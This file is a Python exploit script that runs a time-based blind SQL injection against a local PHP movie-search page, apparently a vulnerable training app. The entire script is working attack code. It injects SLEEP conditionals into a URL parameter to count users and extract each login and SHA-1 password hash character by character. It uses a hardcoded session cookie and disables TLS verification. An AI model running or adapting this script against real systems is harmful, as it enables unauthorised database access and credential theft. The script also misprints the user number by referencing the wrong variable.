import sys
import requests
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
#proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def column_length_finder(s,name: str):
    counter = 0
    flag = False
    while flag == False:
        url = f"http://127.0.0.1/sqli_2.php?movie=1+AND+IF((SELECT+COUNT({name})+FROM+users)+>+{counter}+,+SLEEP(5),+0)&action=go"
        cookies={'security_level':'0','PHPSESSID':'igtih6neq669o2tg1ivicp0nf1'}  #update phpsessid
        response = s.get(url,verify = False,cookies=cookies)
        if response.elapsed.total_seconds() > 2:
            counter = counter + 1
        else:
            flag = True
    return counter 

def login_length_finder(s,id: int): #id starts from 0
    counter = 0
    flag = False
    while flag == False:
        url = f"http://127.0.0.1/sqli_2.php?movie=1+AND+IF(LENGTH((SELECT+login+FROM+users+LIMIT+{id},1))+>+{counter},+SLEEP(5),+0)&action=go"
        cookies={'security_level':'0','PHPSESSID':'igtih6neq669o2tg1ivicp0nf1'}  #update phpsessid
        response = s.get(url,verify = False,cookies=cookies)
        if response.elapsed.total_seconds() > 2:
            counter = counter + 1
        else:
            flag = True
    return counter

def login_enumeration(s,id: int): #id starts form 0
    print(f"Enumerating login")
    login = ""
    login_length = login_length_finder(s,id)
    for i in range(1,login_length + 1):
        for j in range (32,127):
            url = f"http://127.0.0.1/sqli_2.php?movie=1+AND+IF(SUBSTRING((SELECT+login+FROM+users+LIMIT+{id},1),+{i},+1)%3d+'{chr(j)}',+SLEEP(5),+0)&action=go"
            cookies={'security_level':'0','PHPSESSID':'igtih6neq669o2tg1ivicp0nf1'}  #update phpsessid
            response = s.get(url,verify = False,cookies=cookies)
            if response.elapsed.total_seconds() > 2:
                print(f"Found login id{id} character: {chr(j)} at position {i}")
                login += chr(j)
                break
    return(login) 

def password_enumeration(s,id: int): #id starts form 0
    print(f"Enumerating password")
    password = ""
    for i in range(1,41): #it is sha-1 hash
        for j in range (48,104):
            url = f"http://127.0.0.1/sqli_2.php?movie=1+AND+IF(SUBSTRING((SELECT+password+FROM+users+LIMIT+{id},1),+{i},+1)%3d+'{chr(j)}',+SLEEP(5),+0)&action=go"
            cookies={'security_level':'0','PHPSESSID':'igtih6neq669o2tg1ivicp0nf1'}  #update phpsessid
            response = s.get(url,verify = False,cookies=cookies)
            if response.elapsed.total_seconds() > 2:
                print(f"Found password id{id} character: {chr(j)} at position {i}")
                password += chr(j)
                break
    return(password) 

def login_password_enumeration(s):
    print("retriving logins + passwords:")
    user_num = column_length_finder(s,"login")
    for user_id in range (0,user_num):
        login = login_enumeration(s,user_id)
        password = password_enumeration(s,user_id)
        print(f"user {id} login is:{login} \n password is:{password}")
                             
def main():
    s = requests.Session()    
    login_password_enumeration(s)

if __name__ == "__main__":
    main()